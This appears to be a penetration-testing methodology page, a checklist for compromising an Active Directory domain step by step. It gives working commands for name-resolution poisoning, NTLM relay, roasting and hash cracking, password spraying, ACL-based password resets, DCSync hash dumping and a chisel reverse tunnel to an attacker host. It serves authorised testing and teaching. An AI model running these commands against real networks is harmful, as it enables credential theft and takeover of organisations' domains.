---
icon: server
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
  anchors:
    visible: true
---

# Active Directory

## If / Then Guide

| If Enumeration Reveals...                                                | ...Focus on these Attacks...                                                                                                                                                                                                                                                                      | ...and perform these Actions                                                                                               |
| ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| SMB NULL session / LDAP anonymous bind allowed                           | <ul><li><a data-mention href="../field-manual/exploitation/attacking-services/ldap.md">ldap.md</a></li><li><a data-mention href="../field-manual/exploitation/attacking-services/smb.md">smb.md</a></li></ul>                                                                                     | Pull the user list, then feed it into AS-REP roasting and password spraying. `rpcclient -U "" -N <dc-ip>` → `enumdomusers` |
| Multicast/broadcast name resolution active (LLMNR/NBT-NS/mDNS)           | <ul><li><a data-mention href="../field-manual/exploitation/man-in-the-middle/llmnr-nbt-ns-poisoning.md">llmnr-nbt-ns-poisoning.md</a></li><li><a data-mention href="../field-manual/exploitation/man-in-the-middle/ipv6-dns-takeover.md">ipv6-dns-takeover.md</a></li></ul>                       | Poison with responder to capture NetNTLMv2, then crack or relay                                                            |
| SMB signing not required on hosts                                        | <ul><li><a data-mention href="../field-manual/exploitation/initial-access/ntlm-relay-and-coercion-attacks.md">ntlm-relay-and-coercion-attacks.md</a></li></ul>                                                                                                                                    | Relay captured/coerced auth with `ntlmrelayx.py` to a non-signing host                                                     |
| Users without Kerberos pre-auth (`DONT_REQ_PREAUTH`)                     | <ul><li><a data-mention href="../field-manual/exploitation/initial-access/as-rep-roasting.md">as-rep-roasting.md</a></li></ul>                                                                                                                                                                    | `impacket-GetNPUsers` to pull the AS-REP hash, crack with hashcat (`-m 18200`)                                             |
| Service accounts with an SPN (valid creds held)                          | <ul><li><a data-mention href="../field-manual/post-exploitation/privilege-escalation-1/kerberoasting/">kerberoasting</a></li></ul>                                                                                                                                                                | `impacket-GetUserSPNs ... -request`, crack with hashcat (`-m 13100`)                                                       |
| Weak/guessable domain password policy                                    | <ul><li><a data-mention href="../field-manual/exploitation/brute-force/">brute-force</a> > <a data-mention href="../field-manual/exploitation/brute-force/smb.md">smb.md</a></li></ul>                                                                                                            | Password spray the user list: `nxc smb <dc-ip> -u users.txt -p 'Season2025!' --continue-on-success`                        |
| Abusable ACLs in BloodHound (GenericAll, WriteDACL, ForceChangePassword) | <ul><li><a data-mention href="../field-manual/exploitation/initial-access/dacl-acl-abuse.md">dacl-acl-abuse.md</a></li></ul>                                                                                                                                                                      | Reset a password / add to group / grant DCSync via the ACE, then pivot to that principal                                   |
| Owned principal has DS-Replication rights                                | <ul><li><a data-mention href="../field-manual/post-exploitation/privilege-escalation-1/dcsync.md">dcsync.md</a></li></ul>                                                                                                                                                                         | `impacket-secretsdump` to DCSync the domain hashes (target `krbtgt`, Administrator)                                        |
| Delegation configured (unconstrained / constrained / RBCD)               | <ul><li><a data-mention href="../field-manual/exploitation/initial-access/kerberos-delegation-abuse.md">kerberos-delegation-abuse.md</a></li></ul>                                                                                                                                                | Abuse the delegation to impersonate a privileged user to a service                                                         |
| AD CS / certificate templates present                                    | <ul><li><a data-mention href="../field-manual/exploitation/initial-access/adcs-attack.md">adcs-attack.md</a></li></ul>                                                                                                                                                                            | `certipy find -vulnerable`, then exploit the matching ESCx path                                                            |
| Writable GPO / GPP cpassword in SYSVOL                                   | <ul><li><a data-mention href="../field-manual/exploitation/initial-access/group-policy-object-gpo-abuse.md">group-policy-object-gpo-abuse.md</a></li></ul>                                                                                                                                        | Decrypt GPP cpassword, or abuse GPO write to run a privileged action                                                       |
| NThash or ticket obtained (no plaintext)                                 | <ul><li><a data-mention href="../field-manual/exploitation/initial-access/pass-the-hash-overpass-the-hash.md">pass-the-hash-overpass-the-hash.md</a></li></ul>                                                                                                                                    | `nxc smb <target> -u user -H <nthash>`, or pass-the-ticket                                                                 |
| Domain/forest trust present                                              | <ul><li><a data-mention href="../field-manual/exploitation/initial-access/domain-trust-abuse.md">domain-trust-abuse.md</a></li><li><a data-mention href="../field-manual/exploitation/initial-access/golden-ticket-silver-ticket-attacks.md">golden-ticket-silver-ticket-attacks.md</a></li></ul> | Enumerate trust direction, then ExtraSID (child→parent) or cross-forest Kerberoast / SID-history                           |

***

## Uncredentialed Enumeration

### Host Identification

{% stepper %}
{% step %}
#### Passive Listening (Wireshark / net)

Passively listen for Layer 2 traffic (ARP, LLMNR/NBT-NS/mDNS) to discover IP addresses and hostnames without sending a single packet — useful when you must stay quiet.

```bash
sudo wireshark   # display filter: arp || llmnr || nbns || mdns
```

<mark style="color:$primary;">**What to look for:**</mark> broadcast name-resolution requests that reveal hostnames, the AD domain name (often in NBNS/Browser traffic), and which hosts are chatty.

```
NBNS  10.10.10.52 -> broadcast   Name query NB WORKSTATION01<00>
MDNS  10.10.10.60 -> 224.0.0.251 Standard query 0x0 PTR _smb._tcp.local
```

<mark style="color:$primary;">**Next:**</mark> record every hostname/IP into your target list; chatty hosts issuing failed lookups are prime poisoning targets → _Responder Analysis_.

* [ ] Complete
{% endstep %}

{% step %}
#### Analysing with Responder

Run [responder.md](../toolbox/tooling/sniffing-and-spoofing/responder.md "mention") in '**analyze mode**' - it _watches_ LLMNR/NBT-NS/mDNS without poisoning, so we can see what is poisonable before touching anything.

See [llmnr-nbt-ns-poisoning.md](../field-manual/exploitation/man-in-the-middle/llmnr-nbt-ns-poisoning.md "mention").

```bash
sudo responder -I eth0 -A
```

<mark style="color:$primary;">**What to look for:**</mark> `[Analyze mode: ...]` lines showing hosts requesting names that don't resolve - each is a host you could poison to capture its NetNTLMv2 hash. Note the requesting IP and the name requested.

```
[Analyze mode: LLMNR] Request by ['10.10.10.52'] for 'fileshare', ignoring
[Analyze mode: NBT-NS] Request by ['10.10.10.52'] for 'INTRANET', ignoring
```

<mark style="color:$primary;">**What it means:**</mark> a workstation is looking for a name with no DNS record (typo'd share, decommissioned host). In active mode you would answer as that host and the client would authenticate to you.

<mark style="color:$primary;">**Next:**</mark> if you see requests, drop 'analyze mode' and poison for real: _User Foothold › Responder / Inveigh Capture_. Separately, build a relay target list of hosts **without** SMB signing: `nxc smb 10.10.10.0/24 --gen-relay-list relay.txt`.

* [ ] Complete
{% endstep %}

{% step %}
#### ICMP Sweep

Perform an `fping` sweep to find hosts that respond to ICMP echo on the subnet.

```bash
fping -asgq 10.10.10.0/24
```

<mark style="color:$primary;">**What to look for:**</mark> the list of live IPs printed by `-a` (alive).

```
10.10.10.5
10.10.10.25
10.10.10.52
```

<mark style="color:$primary;">**Next:**</mark> feed the alive list into the nmap scans below. Note that ICMP is often filtered - a sparse result does **not** mean few hosts; confirm with nmap `-Pn`.

* [ ] Complete
{% endstep %}

{% step %}
#### Nmap Network Scan

Validate the live-host list with nmap - it may surface hosts the ICMP sweep missed.

```bash
nmap -sn 10.10.10.0/24 -oA hosts
```

<mark style="color:$primary;">**What to look for:**</mark> `Host is up` entries and any resolved hostnames.

```bash
Nmap scan report for DC01.domain.local (10.10.10.5)
Host is up (0.012s latency).
```

<mark style="color:$primary;">**Next:**</mark> take the confirmed host list into the service scan.

* [ ] Complete
{% endstep %}

{% step %}
#### Nmap Service Scan

Scan each host with nmap to fingerprint services. See [88-kerberos.md](../field-manual/intelligence/port-and-service-enumeration/88-kerberos.md "mention").

```bash
nmap -p- -sV -sC -oA ad_full <target>
```

<mark style="color:$primary;">**What to look for:**</mark> the DC "tell" - [88-kerberos.md](../field-manual/intelligence/port-and-service-enumeration/88-kerberos.md "mention")**,** [389-636-3268-3269-ldap.md](../field-manual/intelligence/port-and-service-enumeration/389-636-3268-3269-ldap.md "mention")**,** [139-445-smb.md](../field-manual/intelligence/port-and-service-enumeration/139-445-smb.md "mention")**,** [53-dns.md](../field-manual/intelligence/port-and-service-enumeration/53-dns.md "mention") open on one host confirms a domain controller. The LDAP/SMB scripts usually leak the domain FQDN and hostname.

```
88/tcp   open  kerberos-sec
389/tcp  open  ldap      Microsoft Windows AD LDAP (Domain: domain.local)
445/tcp  open  microsoft-ds
```

<mark style="color:$primary;">**What it means:**</mark> you now have the DC IP and the domain name - the two values that seed every command below.

<mark style="color:$primary;">**Next:**</mark> set your `<dc-ip>` and `domain.local` variables; check versions for quick-win RCE (see _Vulnerability Check_ below).
{% endstep %}
{% endstepper %}

### User Identification

{% stepper %}
{% step %}
#### SMB NULL Session

Attempt an unauthenticated SMB NULL session against the DC to enumerate users with [rpcclient.md](../toolbox/tooling/information-gathering/service-enumeration/rpcclient.md "mention") or [enum4linux.md](../toolbox/tooling/information-gathering/linux-enumeration/enum4linux.md "mention").

```bash
rpcclient -U "" -N <dc-ip> -c enumdomusers
```

```bash
enum4linux-ng -A <dc-ip>
```

<mark style="color:$primary;">**What to look for:**</mark> whether the NULL session is accepted at all, then the returned usernames. Flag **service accounts** (`svc_`, `sql`, `backup`) and anything privileged-sounding.

```
user:[Administrator] rid:[0x1f4]
user:[svc_sql]       rid:[0x450]
user:[jdoe]          rid:[0x451]
```

<mark style="color:$primary;">**What it means:**</mark> NULL session allowed = a free user list with no credentials. `NT_STATUS_ACCESS_DENIED` instead means it's locked down - move to LDAP/Kerbrute.

<mark style="color:$primary;">**Next:**</mark> save usernames to `users.txt` - they feed [as-rep-roasting.md](../field-manual/exploitation/initial-access/as-rep-roasting.md "mention"), password spraying, and later, [kerberoasting](../field-manual/post-exploitation/privilege-escalation-1/kerberoasting/ "mention").

* [ ] Complete
{% endstep %}

{% step %}
#### LDAP Anonymous Authentication

Attempt an anonymous LDAP search against the DC with ldapsearch or windapsearch. See [ldap.md](../field-manual/exploitation/attacking-services/ldap.md "mention").

{% code overflow="wrap" %}
```bash
ldapsearch -x -H ldap://<dc-ip> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```
{% endcode %}

<mark style="color:$primary;">**What to look for:**</mark> whether the anonymous bind succeeds, then `sAMAccountName` values. Also scan `description` fields - admins sometimes store passwords there.

```
sAMAccountName: jdoe
sAMAccountName: svc_backup
description: Service acct - TempPass2023!
```

<mark style="color:$primary;">**What it means:**</mark> a successful bind without creds is another free user list (and occasionally free credentials in description fields). `Operations error` = anonymous bind disabled.

<mark style="color:$primary;">**Next:**</mark> merge any new users into `users.txt`; test any leaked passwords immediately with `nxc smb`.

* [ ] Complete
{% endstep %}

{% step %}
#### Kerberute User Enumeration

Use `kerbrute` with a username wordlist to validate accounts against the DC. It's quiet - valid/invalid is distinguished without generating failed-logon (4625) events.

```bash
kerbrute userenum -d domain.local --dc <dc-ip> usernames.txt
```

<mark style="color:$primary;">**What to look for:**</mark> `VALID USERNAME` lines, and the bonus `has no pre auth required` - Kerbrute hands you the AS-REP hash on the spot.

```
[+] VALID USERNAME:  jdoe@domain.local
[+] svc_backup has no pre auth required. Dumping hash:
    $krb5asrep$23$svc_backup@DOMAIN.LOCAL:a1b2...
```

<mark style="color:$primary;">**Next:**</mark> validated users > `users.txt` for spraying; any AS-REP hash > crack it (`hashcat -m 18200`) > _User Foothold_.

* [ ] Complete
{% endstep %}

{% step %}
#### Impacket lookupsid

Use [impacket](../toolbox/tooling/post-exploitation/impacket/ "mention")'s `lookupsid.py` to RID-cycle the domain and recover users (works via NULL session, better with any creds).

```bash
impacket-lookupsid anonymous@<dc-ip>
```

<mark style="color:$primary;">**What to look for:**</mark> the domain SID and the RID-to-name mappings; `SidTypeUser` entries are accounts.

```
500: DOMAIN\Administrator (SidTypeUser)
1104: DOMAIN\svc_sql (SidTypeUser)
1105: DOMAIN\jdoe (SidTypeUser)
```

<mark style="color:$primary;">**Next:**</mark> this often reveals users the other methods missed - merge into `users.txt`.

* [ ] Complete
{% endstep %}

{% step %}
#### Vulnerability Check for SYSTEM-level RCE

On each discovered host, check for unauthenticated bugs that grant SYSTEM directly - the fastest possible foothold.

```bash
nmap -p445 --script smb-vuln-ms17-010 <target>
nxc smb 10.10.10.0/24 -u '' -p '' | grep -i signing   # context for relay
```

<mark style="color:$primary;">**What to look for:**</mark> `VULNERABLE` in the script output (MS17-010/EternalBlue); on the DC, test Zerologon separately.

```
| smb-vuln-ms17-010:
|   State: VULNERABLE (MS17-010)
```

<mark style="color:$primary;">**Next:**</mark> a VULNERABLE host is a direct SYSTEM shell - exploit it for an immediate foothold before grinding credentials.

* [ ] Complete
{% endstep %}
{% endstepper %}

### User Foothold

{% stepper %}
{% step %}
#### Responder / Inveigh Capture

Run [responder.md](../toolbox/tooling/sniffing-and-spoofing/responder.md "mention") (Linux) or [inveigh.md](../toolbox/tooling/sniffing-and-spoofing/inveigh.md "mention") (Windows) in active mode to poison name resolution and capture NetNTLMv2 hashes.

```bash
sudo responder -I eth0
```

<mark style="color:$primary;">**What to look for:**</mark> `[SMB] NTLMv2-SSP Hash` capture lines. Each is a crackable hash for the account that tried to authenticate. Grab the **whole** line.

```
[SMB] NTLMv2-SSP Client   : 10.10.10.52
[SMB] NTLMv2-SSP Username : DOMAIN\jdoe
[SMB] NTLMv2-SSP Hash     : jdoe::DOMAIN:1122334455...:A1B2...
```

<mark style="color:$primary;">**What it means:**</mark> we've captured an authentication from a real user - if their password is weak we'll crack it to plaintext.

<mark style="color:$primary;">**Next:**</mark> save the full hash to a file and crack it:

```bash
hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt
```

If it won't crack and the target host lacks SMB signing, relay it instead (see next step).

* [ ] Complete
{% endstep %}

{% step %}
#### NTLM Relay (if SMB signing disabled)

If a captured/coerced auth won't crack, relay it to a host that doesn't require SMB signing. See [ntlm-relay-and-coercion-attacks.md](../field-manual/exploitation/initial-access/ntlm-relay-and-coercion-attacks.md "mention").

```bash
ntlmrelayx.py -tf relay.txt -smb2support
```

<mark style="color:$primary;">**What to look for:**</mark> `SUCCEED` authentication lines, then dumped SAM hashes or a session on the relayed target.

```
[*] Authenticating against smb://10.10.10.60 as DOMAIN\jdoe SUCCEED
[*] Dumping local SAM hashes
Administrator:500:aad3b...:31d6cfe0d16ae931...:::
```

<mark style="color:$primary;">**Next:**</mark> use the dumped local admin hash to pass-the-hash to other hosts.

* [ ] Complete
{% endstep %}

{% step %}
#### AS-REP Roasting

For any user with pre-auth disabled, request the AS-REP and crack it offline. See [as-rep-roasting.md](../field-manual/exploitation/initial-access/as-rep-roasting.md "mention").

{% code overflow="wrap" %}
```bash
impacket-GetNPUsers domain.local/ -dc-ip <dc-ip> -usersfile users.txt -no-pass -format hashcat
```
{% endcode %}

<mark style="color:$primary;">**What to look for:**</mark> `$krb5asrep$` hashes returned for roastable users. No output = no pre-auth-disabled accounts.

```
$krb5asrep$23$svc_backup@DOMAIN.LOCAL:f4c1...$9a2b...
```

<mark style="color:$primary;">**Next:**</mark> crack and, on success, you have your first valid credential set:

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

* [ ] Complete
{% endstep %}

{% step %}
#### Password Spray

Gather the password policy first, then spray the user list with netexec. See [password-policy.md](../field-manual/intelligence/windows-domain-enumeration/password-policy.md "mention").

```bash
nxc smb <dc-ip> -u users.txt -p 'Season2025!' --continue-on-success
```

<mark style="color:$primary;">**What to look for:**</mark> `[+]` = valid credential; `(Pwn3d!)` = that account is **local admin** on the host; `[-]` = invalid.

```
SMB  10.10.10.5  445  DC01  [-] domain.local\jdoe:Season2025!
SMB  10.10.10.5  445  DC01  [+] domain.local\svc_sql:Season2025! (Pwn3d!)
```

<mark style="color:$primary;">**What it means:**</mark> you now hold a valid domain credential - and if `(Pwn3d!)`, administrative access to at least one host.

<mark style="color:$primary;">**Next:**</mark> move to _Credentialed Enumeration_ with the new creds. _Respect the lockout threshold - one password per user per window._

* [ ] Complete
{% endstep %}
{% endstepper %}

***

## Credentialed Enumeration &  Exploitation

### Host Identification

{% stepper %}
{% step %}
#### BloodHound Collection

Run [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention") with your creds to map every attack path at once.

```bash
bloodhound-python -u user -p 'pass' -d domain.local -ns <dc-ip> -c all --zip
```

<mark style="color:$primary;">**What to look for:**</mark> a clean collection (counts for users/computers/groups). Then import the zip and run **Shortest Paths to Domain Admins** and mark your account **Owned**.

```
INFO: Found 42 users, 15 computers, 51 groups
INFO: Compressing output into 20250105_bloodhound.zip
```

<mark style="color:$primary;">**Next:**</mark> every later step ("abusable ACLs", "lateral-movement rights", "Kerberoastable") is answered from this graph - keep it open.

See also tool exploitation: [bloodhound.md](../toolbox/tooling/exploitation-tools/bloodhound.md "mention").

* [ ] Complete
{% endstep %}

{% step %}
#### LDAP Domain Dump

Use `ldapdomaindump` for a quick browsable HTML inventory of users, groups and computers.

```bash
ldapdomaindump -u 'domain.local\user' -p 'pass' <dc-ip> -o ldapdump/
```

<mark style="color:$primary;">**What to look for:**</mark> open `domain_computers.html` for the host list, `domain_users.html` for account flags (disabled, pwd-not-required, SPN set).

<mark style="color:$primary;">**Next:**</mark> cross-reference high-value computers (servers, SQL, Exchange) with [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention") targets.

* [ ] Complete
{% endstep %}

{% step %}
#### Share Enumeration

Enumerate shares with [crackmapexec.md](../toolbox/tooling/post-exploitation/crackmapexec.md "mention"), [smbmap.md](../toolbox/tooling/information-gathering/service-enumeration/smbmap.md "mention"), [powerview.md](../toolbox/tooling/post-exploitation/powersploit/powerview.md "mention") or [snaffler.md](../toolbox/tooling/post-exploitation/snaffler.md "mention").

```bash
nxc smb <target> -u user -p 'pass' --shares
```

<mark style="color:$primary;">**What to look for:**</mark> **non-default** shares and anywhere you have `WRITE`. Readable SYSVOL/NETLOGON can hold scripts with creds; writable shares enable coercion/relay tricks.

```
SHARE      PERMISSIONS   REMARK
SYSVOL     READ          Logon server share
Dev$       READ,WRITE
Backups    READ
```

<mark style="color:$primary;">**Next:**</mark> loot readable shares for configs, scripts and keys - run [snaffler.md](../toolbox/tooling/post-exploitation/snaffler.md "mention") to automate the credential hunt.

* [ ] Complete
{% endstep %}
{% endstepper %}

### User Identificaiton

{% stepper %}
{% step %}
#### BloodHound Collectors

Collect with the method that suits your position - [bloodhound.py.md](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/bloodhound.py.md "mention") from Linux, [sharphound.md](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/sharphound.md "mention") from a Windows foothold.

```bash
bloodhound-python -u user -p 'pass' -d domain.local -ns <dc-ip> -c all --zip
```

<mark style="color:$primary;">**What to look for:**</mark> a successful collection against the DC; re-run after every new credential so the graph reflects your current access.

<mark style="color:$primary;">**Next:**</mark> re-mark newly owned principals and re-check paths to DA.

* [ ] Complete
{% endstep %}

{% step %}
#### Password Policy Enumeration

Pull the policy and build a privileged-user list. See [password-policy.md](../field-manual/intelligence/windows-domain-enumeration/password-policy.md "mention").

```bash
nxc smb <dc-ip> -u user -p 'pass' --pass-pol
```

<mark style="color:$primary;">**What to look for:**</mark> **lockout threshold** (governs spray cadence), min length, and complexity - these tell you how aggressively you can spray.

```
Minimum password length: 7
Account Lockout Threshold: 5
Account Lockout Duration: 30 minutes
```

<mark style="color:$primary;">**Next:**</mark> with the threshold known, time any further spraying safely (e.g. 1 attempt / 31 min if threshold is 5).

* [ ] Complete
{% endstep %}
{% endstepper %}

***

## Foothold Enumeration

{% stepper %}
{% step %}
#### Enumerate Security Controls

Identify AV/EDR, AppLocker and PowerShell Constrained Language Mode before attempting to run anything.

```bash
nxc smb <target> -u user -p 'pass' -M enum_av
```

<mark style="color:$primary;">**What to look for:**</mark> which product is present - this dictates whether we can drop binaries or must live off the land.

```
ENUM_AV  10.10.10.60  Found Windows Defender
```

<mark style="color:$primary;">**Next:**</mark> pick tooling accordingly (obfuscated/LOLBAS if EDR present).

* [ ] Complete
{% endstep %}

{% step %}
#### Find Logged-on Users

Map where privileged users are logged on with [netexec.md](../toolbox/tooling/exploitation-tools/netexec.md "mention") - this is how you choose lateral-movement targets.

```bash
nxc smb <targets> -u user -p 'pass' --loggedon-users
```

<mark style="color:$primary;">**What to look for:**</mark> a Domain Admin session on a host you can reach - a target for credential/token theft.

```
SMB  10.10.10.60  FILE01  [+] Enumerated loggedon users
SMB  10.10.10.60  FILE01  DOMAIN\admin  (logged on)
```

<mark style="color:$primary;">**Next:**</mark> if a DA is logged on where you have (or can get) admin, that host becomes your escalation target > dump LSASS / steal token.

* [ ] Complete
{% endstep %}

{% step %}
#### Identify Kerberoastable Accounts

List accounts with an SPN - these are Kerberoastable. See [kerberoasting](../field-manual/post-exploitation/privilege-escalation-1/kerberoasting/ "mention").

```bash
impacket-GetUserSPNs domain.local/user:'pass' -dc-ip <dc-ip>
```

<mark style="color:$primary;">**What to look for:**</mark> service accounts in the result, especially members of privileged groups (shown in the `MemberOf` column).

```
ServicePrincipalName    Name       MemberOf
MSSQLSvc/sql01:1433      svc_sql    CN=Domain Admins,...
```

<mark style="color:$primary;">**What it means:**</mark> a Kerberoastable account _in Domain Admins_ is a potential straight line to domain compromise if its password is weak.

<mark style="color:$primary;">**Next:**</mark> request and crack the ticket: [exploitation](../field-manual/exploitation/ "mention") _›_ [kerberoasting](../field-manual/post-exploitation/privilege-escalation-1/kerberoasting/ "mention").

* [ ] Complete
{% endstep %}

{% step %}
#### Review Owned Users for Abusable ACLs

In [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention"), select each owned principal > **Outbound Object Control**. See [dacl-acl-abuse.md](../field-manual/exploitation/initial-access/dacl-acl-abuse.md "mention").

<mark style="color:$primary;">**What to look for:**</mark> edges like `ForceChangePassword`, `GenericAll`, `GenericWrite`, `WriteDACL`, `AddMember`, `Owns` pointing at higher-value objects.

```
svc_sql --[GenericAll]--> GPO_Admins group
svc_sql --[ForceChangePassword]--> helpdesk_admin
```

<mark style="color:$primary;">**What it means:**</mark> each edge is a concrete escalation - e.g. `GenericAll` on a group lets you add yourself to it.

<mark style="color:$primary;">**Next:**</mark> execute the matching abuse: [exploitation](../field-manual/exploitation/ "mention") _›_ [dacl-acl-abuse.md](../field-manual/exploitation/initial-access/dacl-acl-abuse.md "mention").

* [ ] Complete
{% endstep %}

{% step %}
#### Check Lateral-Movement Rights

In [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention"), check owned users for `CanRDP`, `CanPSRemote`, `ExecuteDCOM` or `SQLAdmin` edges. See [lateral-movement.md](../field-manual/post-exploitation/lateral-movement.md "mention").

<mark style="color:$primary;">**What to look for:**</mark> an execution edge from an owned user to a host you haven't accessed yet.

```
jdoe --[CanPSRemote]--> FILE01.domain.local
```

<mark style="color:$primary;">**Next:**</mark> use the right tool for the edge - `CanPSRemote` > evil-winrm; `CanRDP` > `xfreerdp` - and move to that host.

* [ ] Complete
{% endstep %}
{% endstepper %}

***

## Pivoting

{% stepper %}
{% step %}
#### Establish a Tunnel

Tunnel into segmented subnets through a pivot host with [ligolo-ng.md](../toolbox/tooling/network-tools/ligolo-ng.md "mention") or [chisel.md](../toolbox/tooling/post-exploitation/chisel.md "mention"). See [pivoting-tunnelling-and-port-forwarding](../field-manual/post-exploitation/pivoting-tunnelling-and-port-forwarding/ "mention").

{% code title="Attacker" %}
```bash
chisel server -p 8080 --reverse
```
{% endcode %}

{% code title="Pivot" %}
```bash
chisel client <attacker-ip>:8080 R:socks
```
{% endcode %}

<mark style="color:$primary;">**What to look for:**</mark> confirmation the tunnel/agent connected and the SOCKS listener is up.

```
server: session#1: tun: Listening on 127.0.0.1:1080 (socks5)
```

<mark style="color:$primary;">**Next:**</mark> you can now route tools at the inner subnet > next step.

* [ ] Complete
{% endstep %}

{% step %}
#### Route Tools Through the Proxy

Point proxychains at the SOCKS proxy and run tooling through it. See [network-pivoting-with-socks.md](../field-manual/post-exploitation/pivoting-tunnelling-and-port-forwarding/socks-proxy-pivoting/network-pivoting-with-socks.md "mention").

```bash
# edit /etc/proxychains.conf -> socks5 127.0.0.1 1080
proxychains nxc smb <internal-target> -u user -p 'pass'
```

<mark style="color:$primary;">**What to look for:**</mark> `[proxychains] ... OK` chains and normal tool output from the inner network.

```
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.5.5:445 ... OK
```

<mark style="color:$primary;">**Next:**</mark> re-run the whole enumeration flow from this new vantage point - the inner subnet is a fresh network.

* [ ] Complete
{% endstep %}
{% endstepper %}

***

## Exploitation

{% stepper %}
{% step %}
#### Kerberoasting

Request TGS tickets for SPN accounts and crack offline. See [kerberoasting-with-impacket-getuserspns.py.md](../field-manual/post-exploitation/privilege-escalation-1/kerberoasting/kerberoasting-with-impacket-getuserspns.py.md "mention").

{% code overflow="wrap" %}
```bash
impacket-GetUserSPNs domain.local/user:'pass' -dc-ip <dc-ip> -request -outputfile kerb.hash
```
{% endcode %}

<mark style="color:$primary;">**What to look for:**</mark> `$krb5tgs$` hashes. Prioritise accounts in privileged groups.

```
$krb5tgs$23$*svc_sql$DOMAIN.LOCAL$MSSQLSvc/sql01*$3f8a...
```

<mark style="color:$primary;">**Next:**</mark> crack - a hit yields that service account's plaintext:

```bash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
```

* [ ] Complete
{% endstep %}

{% step %}
#### ACL / DACL Abuse

Abuse over-permissive ACEs to take over more principals. See [dacl-acl-abuse.md](../field-manual/exploitation/initial-access/dacl-acl-abuse.md "mention").

1. <mark style="color:$primary;">**ForceChangePassword:**</mark> reset a target user's password
2. <mark style="color:$primary;">**AddMember / GenericWrite on a group:**</mark> add yourself to a privileged group
3. <mark style="color:$primary;">**GenericAll / GenericWrite on a user:**</mark> reset password, or set an SPN for a targeted Kerberoast
4. <mark style="color:$primary;">**WriteDACL:**</mark> grant yourself DS-Replication rights (> DCSync)

{% code title="e.g. targeted password reset from Linux" %}
```bash
net rpc password <victim> 'NewPass123!' -U domain.local/user%'pass' -S <dc-ip>
```
{% endcode %}

<mark style="color:$primary;">**What to look for:**</mark> the command returning success with no error, then confirm the new access (`nxc smb <dc-ip> -u <victim> -p 'NewPass123!'`).

<mark style="color:$primary;">**Next:**</mark> pivot to the newly controlled principal and re-run [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention") as them.

* [ ] Complete
{% endstep %}

{% step %}
#### DCSync

With replication rights (or DA), pull hashes straight from the DC. See [dcsync.md](../field-manual/post-exploitation/privilege-escalation-1/dcsync.md "mention").

```bash
impacket-secretsdump domain.local/user:'pass'@<dc-ip> -just-dc-user krbtgt
```

<mark style="color:$primary;">**What to look for:**</mark> NTLM hashes in `user:rid:lm:nt:::` form. The **krbtgt** hash enables golden tickets; the **Administrator** hash enables full PtH.

```
krbtgt:502:aad3b...:1a59bd44fd...:::
Administrator:500:aad3b...:31d6cfe0...:::
```

<mark style="color:$primary;">**Next:**</mark> pass-the-hash as Administrator (> _Additional Methods_), or forge a golden ticket from the krbtgt hash.

* [ ] Complete
{% endstep %}

{% step %}
#### Check for Common Vulnerabilities

Test discovered hosts for the high-impact AD CVEs where versions/patch levels fit.

1. NoPac (CVE-2021-42278/42287)
2. PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
3. PetitPotam (coercion → relay to AD CS)
4. Zerologon (CVE-2020-1472)

```bash
nxc smb <dc-ip> -u user -p 'pass' -M nopac
nxc smb <dc-ip> -u user -p 'pass' -M zerologon
```

<mark style="color:$primary;">**What to look for:**</mark> `VULNERABLE` module output.

```
NOPAC  10.10.10.5  DC01  VULNERABLE
```

<mark style="color:$primary;">**Next:**</mark> exploit the confirmed CVE per its Field Manual entry - several lead straight to SYSTEM/DA.

* [ ] Complete
{% endstep %}

{% step %}
#### Check for Common Misconfigurations

Work through the recurring privilege-escalation misconfigurations:

1. Exchange group rights (`Exchange Windows Permissions` > WriteDACL on domain)
2. MS-RPRN / MS-EFSRPC printer-bug coercion
3. MS14-068 (legacy Kerberos PAC)
4. Sniff for LDAP credentials
5. Enumerate DNS records for interesting internal servers
6. Read user/computer `description` fields for cleartext creds
7. Check `PASSWD_NOTREQD` users and test for weak/empty passwords
8. Hunt credentials and interesting files on SMB shares
9. Check `DONT_REQ_PREAUTH` and AS-REP roast any discovered users
10. Writable GPOs - see [group-policy-object-gpo-abuse.md](../field-manual/exploitation/initial-access/group-policy-object-gpo-abuse.md "mention")
11. Delegation - RBCD / constrained / unconstrained - see [kerberos-delegation-abuse.md](../field-manual/exploitation/initial-access/kerberos-delegation-abuse.md "mention")
12. AD CS (ESC1–ESC16) - see [adcs-attack.md](../field-manual/exploitation/initial-access/adcs-attack.md "mention")

```bash
certipy find -u user@domain.local -p 'pass' -dc-ip <dc-ip> -vulnerable -stdout
```

<mark style="color:$primary;">**What to look for (ADCS example):**</mark> a template flagged vulnerable with an ESC category.

```
Template Name : VulnTemplate
[!] Vulnerabilities : ESC1 - Enrollee supplies subject
```

<mark style="color:$primary;">**Next:**</mark> exploit the specific ESCx path to obtain a certificate you can authenticate as a privileged user with.

* [ ] Complete
{% endstep %}

{% step %}
#### Group Policy Preferences (GPP) Passwords

Check SYSVOL for GPP `cpassword` values - AES-encrypted with a Microsoft-published static key, so trivially decrypted.

```bash
nxc smb <dc-ip> -u user -p 'pass' -M gpp_password
```

<mark style="color:$primary;">**What to look for:**</mark> a found `cpassword` and its decrypted value.

```
GPP_PASS  Found groups.xml -> user: svc_deploy  password: Summer2022!
```

<mark style="color:$primary;">**Next:**</mark> test the recovered credential across the domain (`nxc smb <range> -u svc_deploy -p 'Summer2022!'`).

* [ ] Complete
{% endstep %}
{% endstepper %}
